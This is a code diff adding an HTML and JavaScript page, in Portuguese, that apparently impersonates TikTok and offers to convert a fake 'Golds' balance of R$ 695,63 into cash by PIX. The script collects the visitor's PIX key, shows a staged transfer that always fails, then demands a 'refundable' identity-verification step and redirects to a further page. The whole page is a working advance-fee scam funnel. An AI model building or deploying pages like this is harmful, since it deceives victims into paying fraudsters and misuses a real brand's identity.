+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="10"></circle>
+        <line x1="12" y1="16" x2="12" y2="12"></line>
+        <line x1="12" y1="8" x2="12.01" y2="8"></line>
+      </svg>
+    </div>
+  </div>
+
+  <!-- Tela de Conversão -->
+  <div id="screen-converter" class="screen active">
+    <div class="tabs">
+      <button class="tab active">Converter</button>
+      <button class="tab">Intercâmbio</button>
+      <button class="tab">Recarga</button>
+    </div>
+    <div class="saldo-card">
+      <div class="label">Saldo disponível</div>
+       <div class="value">R$ <span id="real-equivalence">382,55</span></div>
+      <div class="equiv">≈ <strong><span id="gold-balance">3.809</span> Golds</strong></div>
+    </div>
+    <div class="options">
+      <button class="option" data-golds="50" data-real="5.00"><strong>R$ 5,00</strong><br>50 Golds</button>
+      <button class="option" data-golds="100" data-real="10.00"><strong>R$ 10,00</strong><br>100 Golds</button>
+      <button class="option" data-golds="200" data-real="20.00"><strong>R$ 20,00</strong><br>200 Golds</button>
+      <button class="option" data-golds="6927" data-real="695.63"><strong>R$ 695,63</strong><br>6.927 Golds</button>
+    </div>
+    <button class="action" type="button" disabled="">Continuar</button>
+    <div class="helper">
+      <strong>Como funciona?</strong><br>
+      Separe sua chave PIX na próxima tela para <em>conversão instantânea</em>.<br>
+      <a href="#" onclick="document.getElementById('faq-popup').style.display='flex'">
+        Leia as FAQ sobre conversão
+      </a>
+    </div>
+  </div>
+
+  <!-- Header PIX -->
+  <div id="header-pix" class="app-header" style="display:none;">
+    <div class="left-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M15 18l-6-6 6-6"></path>
+      </svg>
+    </div>
+    <div class="header-title">Selecione seu método de saque</div>
+    <div class="right-placeholder"></div>
+  </div>
+
+  <!-- Tela PIX -->
+  <div id="screen-pix" class="screen">
+    <h2 style="font-size: 20px; color: #333; margin-bottom: 20px; text-align: center;">Adicionar um novo método de saque</h2>
+    <div class="pix-section">
+      <div class="pix-card">
+        <img src="images/pix.svg" alt="PIX" class="pix-logo">
+        <div class="title">PIX</div>
+        <button class="action-btn" type="button">CADASTRAR CHAVE PIX</button>
+      </div>
+      <div id="pix-form" class="pix-form">
+        <label for="pix-type">Tipo de chave PIX</label>
+        <select id="pix-type">
+          <option value="" disabled="" selected="">Selecione o tipo de chave PIX</option>
+          <option value="cpf">CPF</option>
+          <option value="telefone">Telefone</option>
+          <option value="email">E-mail</option>
+          <option value="aleatoria">Chave Aleatória</option>
+        </select>
+
+        <label for="pix-value">Chave PIX</label>
+        <input id="pix-value" type="text" placeholder="Digite sua chave PIX">
+        <div id="email-suggestions" class="email-suggestions" style="display:none;"></div>
+
+        <button id="pix-confirm" class="pix-confirm" type="button" disabled="">Confirmar</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Header Confirmação -->
+  <div id="header-confirm" class="app-header" style="display:none;">
+    <div class="left-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M15 18l-6-6 6-6"></path>
+      </svg>
+    </div>
+    <div class="header-title">Confirmar saque</div>
+    <div class="right-placeholder"></div>
+  </div>
+
+  <!-- Tela de Confirmação -->
+  <div id="screen-confirm" class="screen">
+    <div id="withdraw-amount">
+      <div class="value">R$ <span id="final-real">0,00</span></div>
+      <div class="label">Quantidade de saque</div>
+    </div>
+    <div class="transfer-card">
+      <div class="method">
+        <img src="images/pix.svg" alt="PIX">
+        <div class="title">PIX <span id="confirm-pix-key"></span></div>
+      </div>
+      <button class="unlink" type="button">Desvincular</button>
+    </div>
+    <div class="final-helper">
+      <strong>Atenção:</strong> verifique se a chave PIX abaixo está correta.<br>
+      Se não for sua chave, clique em <strong>Desvincular</strong> e cadastre novamente.
+    </div>
+    <div class="final-helper">A tarifa de saque será paga pelo Rewards</div>
+    <button id="confirm-withdraw" class="action" type="button">Confirmar</button>
+  </div>
+ <div id="header-loading" class="app-header" style="display:none;">
+  <div class="header-logo">
+    <img src="images/tiktok-icon-free-png.png" alt="Logo TikTok">
+  </div>
+  <div class="right-icons">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M8 3H5a2 2 0 0 0-2 2v3"></path>
+      <path d="M16 3h3a2 2 0 0 1 2 2v3"></path>
+      <path d="M8 21H5a2 2 0 0 1-2-2v-3"></path>
+      <path d="M16 21h3a2 2 0 0 0 2-2v-3"></path>
+    </svg>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <circle cx="12" cy="12" r="10"></circle>
+      <line x1="12" y1="16" x2="12" y2="12"></line>
+      <line x1="12" y1="8" x2="12.01" y2="8"></line>
+    </svg>
+  </div>
+</div>
+    <div class="right-placeholder"></div>
+  
+<div id="screen-loading" class="screen screen-loading">
+  <div id="loading-icon" class="loading-spinner"></div>
+
+  <!-- ícone de erro, sempre presente mas invisível -->
+  <div id="error-icon" class="error-icon">
+    <img src="images/erro.png" alt="Erro" style="width:100%;height:100%;">
+  </div>
+  <!-- texto que suma na etapa 3 -->
+  <div class="progress-text" id="loading-text">Iniciando...</div>
+
+  <div class="progress-container">
+    <div class="progress-bar" id="progress-bar"></div>
+  </div>
+
+  <!-- aqui vai a mensagem dinâmica de erro -->
+  <div class="error-text" id="error-text" style="display:none;"></div>
+</div>
+
+<div id="header-failure" class="app-header" style="display:none;">
+  <div class="left-icon">
+    <!-- SVG da setinha -->
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="#111" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 18l-6-6 6-6"></path>
+    </svg>
+  </div>
+  <div class="header-title">Concluído</div>
+  <div class="right-placeholder"></div>
+</div>
+
+<div id="screen-failure" class="screen">
+  <div style="text-align:center; padding: 40px 20px;">
+    <div style="margin-bottom:24px;">
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="#f26322" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" width="56" height="56">
+        <circle cx="12" cy="12" r="10"></circle>
+        <line x1="12" y1="16" x2="12" y2="12"></line>
+        <line x1="12" y1="8" x2="12.01" y2="8"></line>
+      </svg>
+    </div>
+
+    <h2 style="color:#111; margin-bottom:16px; font-size: 22px; font-weight: 600;">Confirme sua identidade para liberar a transferência</h2>
+    <p style="color:#555; line-height:1.6; margin-bottom:24px; font-size: 16px;">
+      Para sua segurança, é preciso fazer uma verificação única e rápida.
+    </p>
+    
+    <div style="background: #f9f1ed; border-radius: 12px; padding: 16px; margin-bottom: 24px; text-align: left;">
+      <p style="color: #f26322; font-weight: 500; margin-bottom: 12px; font-size: 15px;">→ Valor 100% reembolsado via PIX após aprovação.</p>
+      <p style="color: #555; line-height: 1.5; font-size: 14px;">
+        Processo simples e obrigatório para validar sua conta e liberar os saques sem restrições.
+      </p>
+    </div>
+
+    <button id="failure-ok" class="action animated-gradient" style="font-size: 17px; padding: 14px 24px; border-radius: 10px;">
+      Entendi
+    </button>
+  </div>
+</div>
+
+  <!-- Popup FAQ -->
+  <div id="faq-popup" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#00000099; z-index:999; justify-content:center; align-items:center;">
+    <div style="background:#fff; padding:20px; border-radius:12px; max-width:300px; text-align:center; font-size:15px; color:#333; position:relative;">
+      <p>Seus Tik Tok Golds serão automaticamente convertidos em reais e, na próxima página, você poderá cadastrar sua chave PIX para receber o valor convertido.</p>
+      <button onclick="document.getElementById('faq-popup').style.display='none'" style="margin-top:12px; background:#f26322; border:none; color:#fff; padding:10px 16px; border-radius:8px; font-weight:bold; cursor:pointer;">
+        Entendi
+      </button>
+    </div>
+  </div>
+
+<script>
+  const goldsTotal = 6927,
+        reaisTotal = 695.63,
+        duration   = 1000;
+
+  function animateValue(id, start, end, decimals = 0) {
+    const el    = document.getElementById(id),
+          range = end - start;
+    let startTime = null;
+    function step(ts) {
+      if (!startTime) startTime = ts;
+      const prog = Math.min((ts - startTime) / duration, 1),
+            cur  = start + range * prog;
+      el.textContent = decimals
+        ? cur.toLocaleString('pt-BR',{minimumFractionDigits:decimals,maximumFractionDigits:decimals})
+        : Math.floor(cur).toLocaleString('pt-BR');
+      if (prog < 1) requestAnimationFrame(step);
+    }
+    requestAnimationFrame(step);
+  }
+
+  document.addEventListener('DOMContentLoaded', () => {
+    // 0) CAPTURA DE PARAMS ATUAIS
+    const currentParams = window.location.search.replace(/^\?/, '');
+
+    // 1) Dados iniciais e animação
+    const goldsTotal   = 6927,
+          reaisTotal   = 695.63,
+          duration     = 1000;
+    function animateValue(id, start, end, decimals = 0) {
+      const el    = document.getElementById(id),
+            range = end - start;
+      let startTime = null;
+      function step(ts) {
+        if (!startTime) startTime = ts;
+        const prog = Math.min((ts - startTime) / duration, 1),
+              cur  = start + range * prog;
+        el.textContent = decimals
+          ? cur.toLocaleString('pt-BR',{minimumFractionDigits:decimals,maximumFractionDigits:decimals})
+          : Math.floor(cur).toLocaleString('pt-BR');
+        if (prog < 1) requestAnimationFrame(step);
+      }
+      requestAnimationFrame(step);
+    }
+    animateValue('gold-balance',       0, goldsTotal,  0);
+    animateValue('real-equivalence',   0, reaisTotal,  2);
+
+    // 2) Referências de tela e botões
+    const actionBtn       = document.querySelector('#screen-converter .action');
+    const screenConv      = document.getElementById('screen-converter');
+    const hdrConv         = document.getElementById('header-converter');
+    const screenPix       = document.getElementById('screen-pix');
+    const hdrPix          = document.getElementById('header-pix');
+    const screenConfirm   = document.getElementById('screen-confirm');
+    const hdrConfirm      = document.getElementById('header-confirm');
+    const screenLoading   = document.getElementById('screen-loading');
+    const hdrLoading      = document.getElementById('header-loading');
+    const headerFailure   = document.getElementById('header-failure');
+    const screenFailure   = document.getElementById('screen-failure');
+    const pixType         = document.getElementById('pix-type');
+    const pixInput        = document.getElementById('pix-value');
+    const pixConfirm      = document.getElementById('pix-confirm');
+    const emailSuggestions= document.getElementById('email-suggestions');
+    const confirmWithdraw = document.getElementById('confirm-withdraw');
+    const unlinkBtn       = document.querySelector('.unlink');
+    let selectedReal = 0, pixKey = '', amount = '';
+    const domains = ['@gmail.com','@hotmail.com','@yahoo.com','@outlook.com'];
+
+    // 3) Seleção de valor
+    document.querySelectorAll('.option').forEach(btn => {
+      btn.addEventListener('click', () => {
+        document.querySelectorAll('.option').forEach(b=>b.classList.remove('selected'));
+        btn.classList.add('selected');
+        selectedReal = btn.dataset.real;
+        actionBtn.disabled = false;
+      });
+    });
+
+    // 4) Converter → PIX
+    actionBtn.addEventListener('click', () => {
+      screenConv.classList.remove('active');  hdrConv.style.display = 'none';
+      screenPix.classList.add('active');      hdrPix.style.display  = 'flex';
+    });
+
+    // 5) Botões de voltar
+    document.querySelectorAll('.left-icon').forEach(el => {
+      el.addEventListener('click', () => {
+        if (screenPix.classList.contains('active')) {
+          screenPix.classList.remove('active'); hdrPix.style.display  = 'none';
+          screenConv.classList.add('active');   hdrConv.style.display = 'flex';
+        } else if (screenConfirm.classList.contains('active')) {
+          screenConfirm.classList.remove('active'); hdrConfirm.style.display = 'none';
+          screenPix.classList.add('active');         hdrPix.style.display     = 'flex';
+        }
+      });
+    });
+
+    // 6) Máscara & sugestões de e-mail
+    function applyMask(elem, mask) {
+      const handler = () => {
+        let v = elem.value.replace(/\D/g,''), out='', vi=0;
+        for (let i=0; i<mask.length && vi<v.length; i++) {
+          out += mask[i]==='#'? v[vi++] : mask[i];
+        }
+        elem.value = out;
+      };
+      elem._maskHandler && elem.removeEventListener('input', elem._maskHandler);
+      elem._maskHandler = handler;
+      elem.addEventListener('input', handler);
+    }
+    pixType.addEventListener('change', () => {
+      pixInput.value = '';
+      pixConfirm.disabled = true;
+      emailSuggestions.style.display = 'none';
+      pixInput.removeEventListener('input', pixInput._maskHandler);
+      switch (pixType.value) {
+        case 'cpf':      pixInput.placeholder='000.000.000-00'; applyMask(pixInput,'###.###.###-##'); break;
+        case 'telefone': pixInput.placeholder='(DD) 12345-6789'; applyMask(pixInput,'(##) #####-####'); break;
+        case 'email':    pixInput.placeholder='nome@email.com'; break;
+        case 'aleatoria':pixInput.placeholder='Chave aleatória'; break;
+      }
+    });
+    pixInput.addEventListener('input', () => {
+      pixConfirm.disabled = !pixInput.value.trim();
+      if (pixType.value==='email') {
+        const [local, afterAt] = pixInput.value.split('@');
+        if (local && afterAt==='') {
+          emailSuggestions.innerHTML = domains.map(d=>`<div>${local}${d}</div>`).join('');
+          emailSuggestions.style.display='block';
+          emailSuggestions.querySelectorAll('div').forEach(item=>{
+            item.addEventListener('click',()=>{
+              pixInput.value = item.textContent;
+              emailSuggestions.style.display='none';
+              pixConfirm.disabled=false;
+            });
+          });
+        } else emailSuggestions.style.display='none';
+      }
+    });
+
+    // 7) PIX → Confirmar
+    pixConfirm.addEventListener('click', () => {
+      amount = Number(selectedReal).toLocaleString('pt-BR',{minimumFractionDigits:2,maximumFractionDigits:2});
+      pixKey = pixInput.value;
+      document.getElementById('final-real').textContent      = amount;
+      document.getElementById('confirm-pix-key').textContent = pixKey;
+      screenPix.classList.remove('active');  hdrPix.style.display     = 'none';
+      screenConfirm.classList.add('active'); hdrConfirm.style.display = 'flex';
+    });
+
+    // 8) Desvincular volta pra PIX
+    unlinkBtn.addEventListener('click', () => {
+      screenConfirm.classList.remove('active'); hdrConfirm.style.display = 'none';
+      screenPix.classList.add('active');         hdrPix.style.display     = 'flex';
+    });
+
+    // 9) Loading → Erro → Falha
+    function startLoading() {
+      screenConfirm.style.display = 'none';
+      hdrConfirm.style.display    = 'none';
+      screenLoading.style.display = 'block';
+      hdrLoading.style.display    = 'flex';
+
+      const spinner   = document.getElementById('loading-icon'),
+            errorIcon = document.getElementById('error-icon'),
+            text      = document.getElementById('loading-text'),
+            bar       = document.getElementById('progress-bar'),
+            errText   = document.getElementById('error-text');
+
+      bar.style.width = '0%'; bar.offsetWidth;
+      text.textContent = `Verificando chave PIX ${pixKey}`;
+      bar.style.width = '40%';
+
+      setTimeout(() => {
+        text.textContent = `Fazendo transferência de R$ ${amount} para a Chave PIX ${pixKey}`;
+        bar.style.width = '85%';
+
+        setTimeout(() => {
+          bar.classList.add('error');
+          bar.style.width = '100%';
+          text.classList.add('hidden');
+          errText.textContent   = `Erro ao transferir para a Chave PIX ${pixKey}`;
+          errText.style.display = 'block';
+          spinner.classList.add('fade-out');
+          setTimeout(() => spinner.style.visibility = 'hidden', 500);
+          errorIcon.classList.add('fade-in');
+
+          setTimeout(() => {
+            hdrLoading.style.display    = 'none';
+            screenLoading.style.display = 'none';
+            headerFailure.style.display = 'flex';
+            screenFailure.style.display = 'block';
+            screenConv.classList.remove('active');
+            screenPix.classList.remove('active');
+            screenConfirm.classList.remove('active');
+
+            // 10) Eventos de clique após falha
+            const btnOk = document.getElementById('failure-ok');
+            const backFromFailure = document.querySelector('#header-failure .left-icon');
+             const params = window.location.search;
+            btnOk.addEventListener('click', () => {
+              window.location.href = `../importante${params}`;
+            });
+            backFromFailure.addEventListener('click', () => btnOk.click());
+          }, 1);
+
+        }, 2500);
+      }, 2500);
+    }
+
+    // 11) Inicia o fluxo ao confirmar saque
+    confirmWithdraw.addEventListener('click', startLoading);
+  });
+</script>
+
+
+
+</body></html>
